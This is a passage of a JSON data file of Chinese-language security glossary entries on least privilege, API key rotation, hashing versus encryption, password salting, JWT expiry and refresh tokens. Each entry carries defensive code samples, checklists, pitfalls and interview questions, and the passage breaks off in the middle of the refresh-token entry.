+   "按职责拆分身份：不同服务、环境、Agent 使用不同凭证，互不共享。",
+   "临时提升：需要高权限时短时授予并自动过期，而不是长期持有管理员权限。",
+   "定期审查实际使用情况，回收未使用的权限，并对权限变更做审计。"
+  ],
+  "terms": [
+   {
+    "t": "爆炸半径 (Blast Radius)",
+    "d": "某个凭证或组件被攻破时可能造成的影响范围。"
+   },
+   {
+    "t": "职责分离 (Separation of Duties)",
+    "d": "关键操作需不同主体共同完成，防止单点滥权。"
+   },
+   {
+    "t": "即时访问 (Just-in-Time Access)",
+    "d": "按需临时授予权限，到期自动撤销。"
+   },
+   {
+    "t": "服务账号 (Service Account)",
+    "d": "供程序使用的非人身份，应按服务单独创建。"
+   },
+   {
+    "t": "权限蔓延 (Privilege Creep)",
+    "d": "权限随时间累积而不回收的现象。"
+   }
+  ],
+  "code": {
+   "lang": "sql",
+   "title": "PostgreSQL 最小权限账号",
+   "src": "-- 应用运行账号：只能读写业务表，不能改表结构\nCREATE ROLE app_rw LOGIN PASSWORD 'from-secret-manager';\nGRANT CONNECT ON DATABASE shop TO app_rw;\nGRANT USAGE ON SCHEMA public TO app_rw;\nGRANT SELECT, INSERT, UPDATE ON orders, order_items TO app_rw;\nGRANT SELECT ON products TO app_rw;          -- 商品表只读\n\n-- 报表账号：只读\nCREATE ROLE report_ro LOGIN PASSWORD 'from-secret-manager';\nGRANT CONNECT ON DATABASE shop TO report_ro;\nGRANT USAGE ON SCHEMA public TO report_ro;\nGRANT SELECT ON ALL TABLES IN SCHEMA public TO report_ro;\n\n-- 迁移由单独的高权限账号在 CI 中执行，应用账号无 DDL 权限\nREVOKE CREATE ON SCHEMA public FROM PUBLIC;",
+   "note": "应用、报表、迁移各用独立账号；即使应用存在 SQL 注入，也无法删表。"
+  },
+  "table": {
+   "title": "最小权限落地场景",
+   "head": [
+    "场景",
+    "反例",
+    "正例"
+   ],
+   "rows": [
+    [
+     "数据库",
+     "应用使用超级用户",
+     "按表授予 CRUD 子集"
+    ],
+    [
+     "云 IAM",
+     "Action: \"*\"",
+     "限定具体操作与资源 ARN"
+    ],
+    [
+     "API 密钥",
+     "全权限主密钥",
+     "限定作用域与只读密钥"
+    ],
+    [
+     "AI Agent",
+     "允许执行任意命令",
+     "工具白名单，危险操作需确认"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "细粒度权限",
+    "pros": "风险最小",
+    "cons": "配置和维护成本高",
+    "when": "生产环境与敏感数据"
+   },
+   {
+    "opt": "粗粒度角色",
+    "pros": "管理简单",
+    "cons": "权限过度授予",
+    "when": "早期原型、非敏感环境"
+   },
+   {
+    "opt": "即时临时授权",
+    "pros": "无长期高权限",
+    "cons": "需要审批流程",
+    "when": "运维、生产故障处理"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "图省事给服务分配管理员角色",
+    "fix": "从零权限开始，按报错逐项补充所需权限"
+   },
+   {
+    "bad": "多个服务共用同一个凭证",
+    "fix": "每个服务、每个环境使用独立凭证"
+   },
+   {
+    "bad": "给 AI 编码 Agent 跳过所有权限确认",
+    "fix": "仅在隔离沙箱中放开，常规环境保留确认"
+   },
+   {
+    "bad": "离职或下线后权限未回收",
+    "fix": "定期审计并自动回收闲置权限"
+   }
+  ],
+  "checklist": [
+   "每个服务有独立身份与凭证",
+   "IAM 策略避免通配符",
+   "应用数据库账号无 DDL 权限",
+   "高权限操作采用临时授权",
+   "定期审查并回收未用权限",
+   "Agent 工具与命令权限有白名单"
+  ],
+  "interview": [
+   {
+    "q": "最小权限为什么重要？",
+    "a": "安全事件无法完全避免，凭证会泄露、代码会有漏洞。最小权限不阻止入侵，但决定了入侵后的损失上限：只读账号泄露不会导致数据被删，受限的 Agent 被注入也无法执行危险命令。它是纵深防御的基础。"
+   },
+   {
+    "q": "如何为一个新服务确定最小权限？",
+    "a": "列出服务实际要做的操作和资源；从零权限开始在测试环境运行，根据拒绝记录逐项添加；利用云平台的访问分析工具根据实际调用生成策略；上线后定期对比已授予与实际使用的权限，删除多余部分。"
+   },
+   {
+    "q": "最小权限如何应用到 AI Agent？",
+    "a": "只提供任务需要的工具；文件系统限制在项目目录；命令执行用白名单，删除、推送、部署等需人工确认；使用只读或开发环境凭证；在容器中运行并限制网络。这样即使 Agent 被提示注入，损害也受限。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "NIST Glossary: least privilege",
+    "url": "https://csrc.nist.gov/glossary/term/least_privilege"
+   },
+   {
+    "title": "AWS IAM: Security best practices",
+    "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html"
+   },
+   {
+    "title": "PostgreSQL Docs: Privileges",
+    "url": "https://www.postgresql.org/docs/current/ddl-priv.html"
+   }
+  ]
+ },
+ {
+  "slug": "api-key-rotation",
+  "def": "API 密钥轮换（API Key Rotation）是按计划或在疑似泄露时生成新密钥、平滑切换使用方、再吊销旧密钥的运维实践。它属于密钥管理（Secrets Management）层，目的是缩短任一密钥的有效暴露窗口。轮换的关键在于支持新旧密钥短期并存，实现零停机切换。",
+  "how": [
+   "盘点所有密钥及其使用方、存放位置、权限范围和负责人，建立密钥清单。",
+   "生成新密钥，并写入密钥管理服务或部署平台的环境变量，而非代码仓库。",
+   "在新旧密钥同时有效的过渡期内，逐个更新所有使用方的配置并重新部署。",
+   "通过访问日志确认旧密钥已无调用后再吊销；疑似泄露时应立即吊销。",
+   "记录轮换时间与操作人，并通过自动化（定时任务或密钥管理服务）降低人工成本。"
+  ],
+  "terms": [
+   {
+    "t": "密钥管理服务 (Secrets Manager)",
+    "d": "集中存储、访问控制和轮换密钥的服务。"
+   },
+   {
+    "t": "双密钥过渡 (Dual-Key Overlap)",
+    "d": "新旧密钥同时有效一段时间，确保无缝切换。"
+   },
+   {
+    "t": "吊销 (Revocation)",
+    "d": "使密钥立即失效，不能再用于认证。"
+   },
+   {
+    "t": "密钥扫描 (Secret Scanning)",
+    "d": "检测代码仓库与日志中意外提交的密钥。"
+   },
+   {
+    "t": "短期凭证 (Short-lived Credential)",
+    "d": "自动过期的临时凭证，如 OIDC 联合身份签发的令牌。"
+   }
+  ],
+  "code": {
+   "lang": "bash",
+   "title": "零停机轮换流程",
+   "src": "# 0. 先在服务商控制台创建新密钥（此时新旧两把同时有效）\n\n# 1. 写入部署平台的密钥存储（示例：GitHub Actions Secrets）\ngh secret set PAYMENT_API_KEY --body \"$NEW_KEY\"\n\n# 或写入 Cloudflare Workers 的密钥\nprintf '%s' \"$NEW_KEY\" | npx wrangler secret put PAYMENT_API_KEY\n\n# 2. 重新部署所有使用方，使其读取新密钥\ngh workflow run deploy.yml\n\n# 3. 观察：确认旧密钥不再有调用（在服务商的用量/日志页面查看）\n\n# 4. 在服务商控制台吊销旧密钥\n\n# 5. 防止泄露：扫描仓库历史中残留的密钥\ngitleaks detect --source . --log-opts=\"--all\"",
+   "note": "顺序是先加新、再切换、确认后吊销旧；命令均为对应工具的真实用法。"
+  },
+  "table": {
+   "title": "轮换触发与节奏",
+   "head": [
+    "触发条件",
+    "动作",
+    "时限"
+   ],
+   "rows": [
+    [
+     "确认或疑似泄露",
+     "立即吊销并更换",
+     "尽快，不等过渡期"
+    ],
+    [
+     "人员离职/权限变更",
+     "轮换其接触过的密钥",
+     "尽快"
+    ],
+    [
+     "定期轮换",
+     "按计划生成新密钥并切换",
+     "依组织策略与合规要求"
+    ],
+    [
+     "服务商提示",
+     "按通知处理",
+     "按服务商要求"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "长期静态密钥 + 定期轮换",
+    "pros": "接入简单，服务商普遍支持",
+    "cons": "仍有暴露窗口",
+    "when": "第三方 SaaS API"
+   },
+   {
+    "opt": "短期凭证（OIDC 联合等）",
+    "pros": "无需保存长期密钥",
+    "cons": "需平台支持与配置",
+    "when": "CI 访问云平台"
+   },
+   {
+    "opt": "密钥管理服务自动轮换",
+    "pros": "自动化、可审计",
+    "cons": "依赖云服务与集成工作",
+    "when": "数据库凭证等受支持场景"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "先吊销旧密钥再部署新密钥",
+    "fix": "先让新密钥上线，确认无旧密钥调用后再吊销"
+   },
+   {
+    "bad": "泄露后只删除提交，没有吊销密钥",
+    "fix": "Git 历史和 fork 中仍可找到，必须立即吊销"
+   },
+   {
+    "bad": "密钥写在前端代码或移动应用里",
+    "fix": "前端可见即公开，秘密密钥只放在服务端"
+   },
+   {
+    "bad": "把 .env 内容贴给 AI 工具排查问题",
+    "fix": "脱敏后再分享，若已泄露立即轮换"
+   }
+  ],
+  "checklist": [
+   "所有密钥有清单与负责人",
+   "密钥存于密钥管理服务或平台变量",
+   "支持新旧密钥并存切换",
+   "仓库开启密钥扫描",
+   "有泄露应急吊销流程",
+   "CI 优先使用短期凭证"
+  ],
+  "interview": [
+   {
+    "q": "如何实现零停机的密钥轮换？",
+    "a": "依赖新旧密钥并存：先生成新密钥并保持旧密钥有效，把新密钥分发到所有使用方并重新部署，通过日志确认旧密钥流量归零后再吊销。若服务商只允许一把有效密钥，就需要维护窗口或在应用层支持多密钥回退。"
+   },
+   {
+    "q": "密钥误提交到 Git 后该怎么做？",
+    "a": "首先立即吊销并更换该密钥，因为公开仓库可能在几分钟内被扫描利用，私有仓库也可能被克隆。然后排查是否有异常调用，再视需要清理历史。仅仅删除提交或改写历史并不能让已泄露的密钥变安全。"
+   },
+   {
+    "q": "为什么短期凭证优于定期轮换？",
+    "a": "定期轮换只是缩短暴露窗口，长期密钥仍需存储和分发。短期凭证由身份联合（如 CI 的 OIDC）按需签发、分钟到小时级自动过期，没有需要保管的长期秘密，泄露后可利用的时间也很短。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP Secrets Management Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"
+   },
+   {
+    "title": "GitHub Docs: About secret scanning",
+    "url": "https://docs.github.com/en/code-security/secret-scanning/introduction/about-secret-scanning"
+   },
+   {
+    "title": "Gitleaks (GitHub)",
+    "url": "https://github.com/gitleaks/gitleaks"
+   }
+  ]
+ },
+ {
+  "slug": "hashing-vs-encryption",
+  "def": "哈希（Hashing）是把任意数据映射为固定长度摘要的单向函数，无法从摘要还原原文；加密（Encryption）是用密钥把明文变成密文的可逆变换，持有密钥即可解密。二者同属密码学基础层，但用途截然不同：哈希用于完整性校验和密码存储，加密用于保密传输和存储需要还原的数据。",
+  "how": [
+   "哈希：同一输入始终得到同一摘要，输入微小变化导致摘要大幅变化，且难以找到碰撞。",
+   "密码存储使用专门的慢哈希（Argon2、bcrypt、scrypt）并加盐，提高暴力破解成本。",
+   "对称加密（如 AES-GCM）用同一密钥加解密，速度快，适合大量数据。",
+   "非对称加密用公钥加密、私钥解密，常用于密钥交换与数字签名，TLS 结合两者使用。",
+   "HMAC 结合哈希与密钥生成消息认证码，可同时验证完整性和来源。"
+  ],
+  "terms": [
+   {
+    "t": "SHA-256",
+    "d": "SHA-2 家族的通用哈希函数，输出 256 位，速度快。"
+   },
+   {
+    "t": "AES-GCM",
+    "d": "带认证的对称加密模式，同时提供保密性和完整性。"
+   },
+   {
+    "t": "HMAC",
+    "d": "基于哈希和密钥的消息认证码，用于签名校验。"
+   },
+   {
+    "t": "Nonce/IV",
+    "d": "加密时使用的一次性随机数，同一密钥下不得重复。"
+   },
+   {
+    "t": "编码 (Encoding)",
+    "d": "如 Base64，只是格式转换，无任何安全性。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "哈希、HMAC 与加密对比",
+   "src": "import hashlib, hmac, os\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\n\ndata = b\"order:1024:paid\"\n\n# 1. 哈希：单向，用于完整性校验（文件校验和等）\nprint(hashlib.sha256(data).hexdigest())\n\n# 2. HMAC：带密钥的哈希，验证消息未被篡改且来自持钥方\nkey = os.urandom(32)\ntag = hmac.new(key, data, hashlib.sha256).digest()\nprint(hmac.compare_digest(tag, hmac.new(key, data, hashlib.sha256).digest()))\n\n# 3. 对称加密：可逆，持有密钥才能解密\naes_key = AESGCM.generate_key(bit_length=256)\nnonce = os.urandom(12)                 # 同一密钥下 nonce 绝不能重复\nct = AESGCM(aes_key).encrypt(nonce, data, None)\nprint(AESGCM(aes_key).decrypt(nonce, ct, None))   # b'order:1024:paid'\n\n# 注意：密码存储不要用 sha256，应使用 argon2/bcrypt 等慢哈希",
+   "note": "依赖 cryptography 库；三段代码分别对应完整性、来源认证和保密性。"
+  },
+  "table": {
+   "title": "哈希、加密、编码对比",
+   "head": [
+    "维度",
+    "哈希",
+    "加密",
+    "编码"
+   ],
+   "rows": [
+    [
+     "可逆性",
+     "不可逆",
+     "有密钥可逆",
+     "任何人可逆"
+    ],
+    [
+     "需要密钥",
+     "否（HMAC 需要）",
+     "是",
+     "否"
+    ],
+    [
+     "主要用途",
+     "完整性、密码存储",
+     "保密性",
+     "数据格式转换"
+    ],
+    [
+     "示例",
+     "SHA-256、Argon2",
+     "AES-GCM、RSA-OAEP",
+     "Base64、URL 编码"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "慢哈希存密码",
+    "pros": "泄露后难以批量破解",
+    "cons": "登录验证消耗 CPU/内存",
+    "when": "用户密码存储"
+   },
+   {
+    "opt": "加密存储敏感字段",
+    "pros": "可还原业务所需数据",
+    "cons": "需要密钥管理",
+    "when": "身份证号、第三方令牌"
+   },
+   {
+    "opt": "快速哈希",
+    "pros": "性能高",
+    "cons": "不适合保护低熵秘密",
+    "when": "文件校验、去重、缓存键"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "用 SHA-256 或 MD5 直接存密码",
+    "fix": "使用 Argon2id、bcrypt 或 scrypt 并加盐"
+   },
+   {
+    "bad": "把 Base64 当成加密",
+    "fix": "Base64 只是编码，敏感数据需真正加密"
+   },
+   {
+    "bad": "加密密钥与密文存放在同一数据库",
+    "fix": "密钥放密钥管理服务，与数据分离"
+   },
+   {
+    "bad": "自己设计加密算法或模式",
+    "fix": "使用成熟库的高层 API，如 AES-GCM、libsodium"
+   }
+  ],
+  "checklist": [
+   "密码使用专用慢哈希",
+   "需还原的敏感数据才加密",
+   "使用带认证的加密模式",
+   "nonce 不重复且由安全随机数生成",
+   "密钥与数据分离存储并可轮换",
+   "签名比较使用恒定时间函数"
+  ],
+  "interview": [
+   {
+    "q": "为什么密码要哈希而不是加密？",
+    "a": "系统只需验证用户输入的密码是否正确，不需要知道原文。加密意味着存在能还原所有密码的密钥，密钥一旦泄露所有密码暴露。慢哈希加盐后即使数据库泄露，攻击者也只能逐个高成本暴力猜测。"
+   },
+   {
+    "q": "为什么不能用 SHA-256 存密码？",
+    "a": "SHA-256 设计目标是快，GPU 每秒可计算海量次，对低熵的人类密码可快速字典攻击。Argon2、bcrypt 等专门设计为可调节的慢，Argon2 还消耗大量内存，使 GPU/ASIC 并行破解成本大幅上升。"
+   },
+   {
+    "q": "HMAC 和普通哈希的区别？",
+    "a": "普通哈希任何人都能计算，攻击者篡改数据后可重新计算哈希；HMAC 需要密钥，只有持钥方能生成有效标签，因此能同时证明完整性和来源。Webhook 签名、Cookie 签名常用 HMAC，比较时需用恒定时间函数防时序攻击。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP Cryptographic Storage Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html"
+   },
+   {
+    "title": "cryptography Docs: AEAD",
+    "url": "https://cryptography.io/en/latest/hazmat/primitives/aead/"
+   },
+   {
+    "title": "RFC 2104: HMAC",
+    "url": "https://www.rfc-editor.org/rfc/rfc2104"
+   }
+  ]
+ },
+ {
+  "slug": "password-salting",
+  "def": "密码加盐（Password Salting）是在哈希密码前为每个用户生成唯一的随机值（盐，Salt）并与密码一起计算哈希的技术。它属于凭证存储层，使相同密码产生不同哈希，令预计算的彩虹表失效，并迫使攻击者对每个账号单独破解。现代密码哈希算法如 Argon2、bcrypt 已内置加盐。",
+  "how": [
+   "用户注册或改密时，用密码学安全随机数生成器为该用户生成足够长的随机盐。",
+   "把盐和密码一起输入慢哈希函数（Argon2id、bcrypt、scrypt），得到哈希值。",
+   "盐不是秘密，通常与算法参数、哈希值一起编码成一个字符串存入数据库。",
+   "登录时从存储字符串中解析出盐和参数，对输入密码重新计算并以恒定时间比较。",
+   "可选再加“胡椒”（Pepper）：一个存放在数据库之外的全局密钥，数据库单独泄露时提供额外保护。"
+  ],
+  "terms": [
+   {
+    "t": "盐 (Salt)",
+    "d": "每个密码独有的随机值，公开存储，用于使哈希唯一。"
+   },
+   {
+    "t": "彩虹表 (Rainbow Table)",
+    "d": "预先计算的哈希到明文对照表，加盐后失效。"
+   },
+   {
+    "t": "胡椒 (Pepper)",
+    "d": "存于数据库外的全局秘密，作为额外防护层。"
+   },
+   {
+    "t": "Argon2id",
+    "d": "密码哈希竞赛胜出算法的混合变体，抗 GPU 与侧信道。"
+   },
+   {
+    "t": "工作因子 (Work Factor)",
+    "d": "控制哈希计算成本的参数，如 bcrypt 的 cost。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "argon2-cffi 哈希与验证",
+   "src": "# pip install argon2-cffi\nfrom argon2 import PasswordHasher\nfrom argon2.exceptions import VerifyMismatchError\n\nph = PasswordHasher()          # 默认 Argon2id，自动生成随机盐\n\nh1 = ph.hash(\"correct horse battery staple\")\nh2 = ph.hash(\"correct horse battery staple\")\nprint(h1)          # $argon2id$v=19$m=...,t=...,p=...$<盐>$<哈希>\nprint(h1 != h2)    # True：相同密码因盐不同而哈希不同\n\ndef login(stored_hash: str, password: str) -> bool:\n    try:\n        ph.verify(stored_hash, password)   # 从字符串中解析盐和参数\n    except VerifyMismatchError:\n        return False\n    if ph.check_needs_rehash(stored_hash):\n        pass   # 参数升级后，在此用新参数重新哈希并保存\n    return True\n\nprint(login(h1, \"correct horse battery staple\"))  # True",
+   "note": "盐与参数编码在同一字符串中，无需单独存储；check_needs_rehash 支持平滑升级参数。"
+  },
+  "table": {
+   "title": "密码哈希算法对比",
+   "head": [
+    "算法",
+    "特点",
+    "注意"
+   ],
+   "rows": [
+    [
+     "Argon2id",
+     "内存困难，参数灵活",
+     "OWASP 首选推荐"
+    ],
+    [
+     "scrypt",
+     "内存困难",
+     "参数需按指南设置"
+    ],
+    [
+     "bcrypt",
+     "成熟、广泛支持",
+     "输入超过 72 字节会被截断"
+    ],
+    [
+     "PBKDF2",
+     "FIPS 合规场景可用",
+     "需很高迭代次数"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "提高哈希成本参数",
+    "pros": "破解更难",
+    "cons": "登录更耗资源，易被用作 DoS",
+    "when": "在可接受延迟内尽量调高"
+   },
+   {
+    "opt": "增加胡椒",
+    "pros": "数据库单独泄露时多一层保护",
+    "cons": "密钥管理与轮换复杂",
+    "when": "有密钥管理基础设施时"
+   },
+   {
+    "opt": "使用托管认证服务",
+    "pros": "无需自己存密码",
+    "cons": "依赖第三方",
+    "when": "不想承担密码存储风险"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "所有用户使用同一个固定盐",
+    "fix": "每个密码独立生成随机盐"
+   },
+   {
+    "bad": "盐 + SHA-256 就认为足够",
+    "fix": "加盐解决彩虹表，还需慢哈希抵抗暴力破解"
+   },
+   {
+    "bad": "自己拼接盐和密码手写哈希流程",
+    "fix": "使用成熟库的高层 API，自动处理盐与编码"
+   },
+   {
+    "bad": "使用 bcrypt 时未考虑 72 字节限制",
+    "fix": "限制密码长度或改用 Argon2id"
+   }
+  ],
+  "checklist": [
+   "使用 Argon2id 或 bcrypt 等慢哈希",
+   "每个密码有独立随机盐",
+   "成本参数经过基准测试",
+   "支持参数升级时重新哈希",
+   "验证使用库提供的比较函数",
+   "日志中绝不记录明文密码"
+  ],
+  "interview": [
+   {
+    "q": "盐为什么可以公开存储？",
+    "a": "盐的作用不是保密，而是让每个密码的哈希唯一：攻击者无法用一张预计算表破解所有用户，也无法通过相同哈希发现使用相同密码的用户，必须针对每个用户单独计算。真正的计算成本来自慢哈希本身。"
+   },
+   {
+    "q": "盐和胡椒的区别？",
+    "a": "盐每用户不同、与哈希一起存于数据库，用于防预计算和批量破解；胡椒是全局秘密，存放在数据库之外（如密钥管理服务），只有在攻击者仅拿到数据库而没拿到应用密钥时才提供额外保护，代价是增加密钥管理复杂度。"
+   },
+   {
+    "q": "如何为老系统升级密码哈希算法？",
+    "a": "在用户下次成功登录时，用明文密码以新算法重新哈希并替换；或者对旧哈希值再套一层新算法立即全量升级，登录时按标识选择验证方式。存储格式中带有算法和参数标识，是平滑迁移的前提。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP Password Storage Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
+   },
+   {
+    "title": "RFC 9106: Argon2",
+    "url": "https://www.rfc-editor.org/rfc/rfc9106"
+   },
+   {
+    "title": "argon2-cffi Docs",
+    "url": "https://argon2-cffi.readthedocs.io/en/stable/"
+   }
+  ]
+ },
+ {
+  "slug": "jwt-expiry",
+  "def": "JWT 过期机制（JWT Expiry）指在 JSON Web Token 的载荷中使用 exp（过期时间）、nbf（生效时间）、iat（签发时间）等注册声明限定令牌有效期，由校验方在每次请求时检查。由于 JWT 通常无状态、签发后难以撤销，较短的过期时间是控制令牌泄露风险的主要手段，常与刷新令牌配合使用。",
+  "how": [
+   "签发时在载荷中写入 exp，值为 Unix 时间戳秒数（NumericDate），表示令牌过期时刻。",
+   "令牌由头部、载荷、签名三段 Base64URL 编码组成，签名保证声明不被篡改。",
+   "校验方先用固定的算法和密钥验证签名，再检查 exp、nbf、iss、aud 等声明。",
+   "当前时间超过 exp（允许少量时钟偏差 leeway）则拒绝，客户端需用刷新令牌换取新令牌。",
+   "需要提前失效时，只能借助黑名单、令牌版本号或缩短有效期等有状态补充手段。"
+  ],
+  "terms": [
+   {
+    "t": "exp 声明",
+    "d": "过期时间，NumericDate 格式，超过即令牌无效。"
+   },
+   {
+    "t": "时钟偏差 (Clock Skew)",
+    "d": "签发方与校验方时间不一致，通常允许小幅容忍。"
+   },
+   {
+    "t": "JWS",
+    "d": "JSON Web Signature，带签名的 JWT 形式，载荷未加密可被读取。"
+   },
+   {
+    "t": "aud 声明",
+    "d": "令牌的目标受众，校验方应确认令牌是发给自己的。"
+   },
+   {
+    "t": "jti 声明",
+    "d": "令牌唯一 ID，可用于黑名单和防重放。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "PyJWT 设置与校验过期",
+   "src": "# pip install pyjwt\nimport datetime as dt, os\nimport jwt\n\nSECRET = os.environ[\"JWT_SECRET\"]   # 至少 32 字节随机值\nnow = dt.datetime.now(dt.timezone.utc)\n\ntoken = jwt.encode({\n    \"sub\": \"user_42\",\n    \"aud\": \"api.example.com\",\n    \"iat\": now,\n    \"exp\": now + dt.timedelta(minutes=15),   # 短有效期\n}, SECRET, algorithm=\"HS256\")\n\ntry:\n    claims = jwt.decode(\n        token, SECRET,\n        algorithms=[\"HS256\"],       # 显式指定算法，防算法混淆\n        audience=\"api.example.com\",\n        leeway=30,                   # 容忍 30 秒时钟偏差\n    )\n    print(claims[\"sub\"])\nexcept jwt.ExpiredSignatureError:\n    print(\"令牌已过期，请用刷新令牌换新\")\nexcept jwt.InvalidTokenError as e:\n    print(\"无效令牌:\", e)",
+   "note": "PyJWT 默认校验 exp；datetime 会被转换为时间戳；必须显式传入 algorithms。"
+  },
+  "table": {
+   "title": "JWT 时间相关声明",
+   "head": [
+    "声明",
+    "含义",
+    "校验行为"
+   ],
+   "rows": [
+    [
+     "exp",
+     "过期时间",
+     "当前时间晚于它则拒绝"
+    ],
+    [
+     "nbf",
+     "生效时间",
+     "当前时间早于它则拒绝"
+    ],
+    [
+     "iat",
+     "签发时间",
+     "可用于计算令牌年龄"
+    ],
+    [
+     "jti",
+     "唯一标识",
+     "配合黑名单或防重放"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "短期访问令牌（分钟级）",
+    "pros": "泄露窗口小",
+    "cons": "需刷新机制",
+    "when": "大多数 API 认证"
+   },
+   {
+    "opt": "长期 JWT",
+    "pros": "实现简单",
+    "cons": "泄露后长期可用且难撤销",
+    "when": "不推荐用于用户会话"
+   },
+   {
+    "opt": "JWT + 服务端黑名单",
+    "pros": "可立即撤销",
+    "cons": "失去无状态优势",
+    "when": "需强制登出的场景"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "签发时不设置 exp",
+    "fix": "所有用户令牌都设置较短的 exp"
+   },
+   {
+    "bad": "decode 时未指定 algorithms",
+    "fix": "显式限定允许的算法，拒绝 none"
+   },
+   {
+    "bad": "在 JWT 载荷中放敏感信息",
+    "fix": "载荷只是 Base64URL 编码，任何人可读"
+   },
+   {
+    "bad": "用户改密或登出后旧令牌仍有效",
+    "fix": "缩短有效期，或引入令牌版本号/黑名单"
+   }
+  ],
+  "checklist": [
+   "访问令牌设置短 exp",
+   "校验签名、exp、iss、aud",
+   "显式限定签名算法",
+   "时钟偏差容忍值较小",
+   "载荷不含敏感数据",
+   "有强制失效方案"
+  ],
+  "interview": [
+   {
+    "q": "JWT 为什么难以撤销？",
+    "a": "JWT 的设计是自包含的：校验方只需验证签名和声明，不查询服务端状态。这带来了扩展性，但也意味着签发后在 exp 之前一直有效。要提前撤销，就必须引入黑名单、版本号等服务端状态，部分抵消无状态的优势。"
+   },
+   {
+    "q": "访问令牌有效期设多长合适？",
+    "a": "没有统一值，取决于风险与体验：常见做法是访问令牌设为几分钟到一小时，配合刷新令牌维持登录。越敏感的系统越短。关键是权衡泄露窗口与刷新频率，并确保刷新令牌本身有更严格的保护。"
+   },
+   {
+    "q": "什么是 JWT 算法混淆攻击？",
+    "a": "若校验代码信任令牌头部的 alg 字段，攻击者可把算法改为 none 绕过签名，或把 RS256 改为 HS256，用公开的公钥当作 HMAC 密钥伪造签名。防御方法是服务端显式指定允许的算法并按密钥类型校验。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "RFC 7519: JSON Web Token",
+    "url": "https://www.rfc-editor.org/rfc/rfc7519"
+   },
+   {
+    "title": "RFC 8725: JWT Best Current Practices",
+    "url": "https://www.rfc-editor.org/rfc/rfc8725"
+   },
+   {
+    "title": "PyJWT Docs: Usage",
+    "url": "https://pyjwt.readthedocs.io/en/stable/usage.html"
+   }
+  ]
+ },
+ {
+  "slug": "refresh-tokens",
+  "def": "刷新令牌（Refresh Token）是授权服务器签发的长期凭证，仅用于向令牌端点换取新的短期访问令牌（Access Token），而不直接访问资源。它由 OAuth 2.0（RFC 6749）定义，用来兼顾安全与体验：访问令牌短命以缩小泄露窗口，刷新令牌让用户免于频繁重新登录，因此需要更严格的存储与保护。",
+  "how": [
+   "用户登录或授权成功后，授权服务器同时返回短期访问令牌和长期刷新令牌。",
+   "客户端用访问令牌调用 API；访问令牌过期后，向令牌端点提交刷新令牌。",
+   "服务器校验刷新令牌（是否存在、未过期、未吊销、属于该客户端），签发新的访问令牌。",
+   "启用轮换（Rotation）时同时签发新刷新令牌并作废旧的；旧令牌被再次使用即视为泄露。",
+   "检测到重用时吊销该令牌族下的全部刷新令牌，强制合法用户与攻击者都重新登录。"
+  ],
+  "terms": [
+   {
+    "t": "刷新令牌轮换 (Rotation)",
+    "d": "每次刷新都签发新刷新令牌并使旧令牌失效。"
+   },
+   {
+    "t": "重用检测 (Reuse Detection)",
+    "d": "已作废的刷新令牌再次出现时判定泄露并吊销整个令牌族。"
+   },
+   {
+    "t": "令牌族 (Token Family)",
+    "d": "由同一次登录衍生出的一串刷新令牌。"
+   },
+   {
+    "t": "发送者约束 (Sender-Constrained)",
+    "d": "令牌绑定客户端密钥，如 DPoP、mTLS，被盗也难使用。"
+   },
+   {
+    "t": "滑动过期 (Sliding Expiration)",
+    "d": "每次使用延长有效期，但通常仍设绝对上限。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "刷新令牌轮换与重用检测",
+   "src": "import secrets, hashlib, datetime as dt\n\ndef _h(t): return hashlib.sha256(t.encode()).hexdigest()   # 只存哈希\n\ndef issue_refresh(db, user_id, family_id=None):\n    token = secrets.token_urlsafe(32)\n    db.insert(\"refresh_tokens\", token_hash=_h(token), user_id=user_id,\n              family_id=family_id or secrets.token_hex(8), used=False,\n              expires_at=dt.datetime.utcnow() + dt.timedelta(days=30))\n    return token\n\ndef refresh(db, token):\n    row = db.find_one(\"refresh_tokens\", token_hash=_h(token))\n    if row is None or row.expires_at < dt.datetime.utcnow():\n        raise PermissionError(\"invalid\")\n    if row.used:                                  # 旧令牌被重放：判定泄露\n        db.revoke_family(row.family_id)\n        raise PermissionError(\"reuse detected\")\n    db.mark_used(row.id)                          # 作废旧令牌\n    new_rt = issue_refresh(db, row.user_id, row.family_id)\n    access = make_access_token(row.user_id)       # 签发短期访问令牌\n    return access, new_rt",
+   "note": "db 与 make_access_token 为示意接口；要点是哈希存储、一次性使用与令牌族吊销。"
+  },
+  "table": {
+   "title": "访问令牌 vs 刷新令牌",
+   "head": [
+    "维度",
+    "访问令牌",
+    "刷新令牌"
+   ],
+   "rows": [
+    [
+     "用途",
+     "调用资源 API",
+     "换取新访问令牌"
+    ],
+    [
+     "有效期",
+     "短（分钟到小时）",
+     "长（天到周，需上限）"
+    ],
+    [
+     "发送对象",
+     "资源服务器",
+     "仅授权服务器令牌端点"
+    ],
+    [
+     "撤销方式",
+     "通常等待过期",
+     "服务端可随时吊销"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "刷新令牌轮换 + 重用检测",
+    "pros": "能发现令牌被盗",
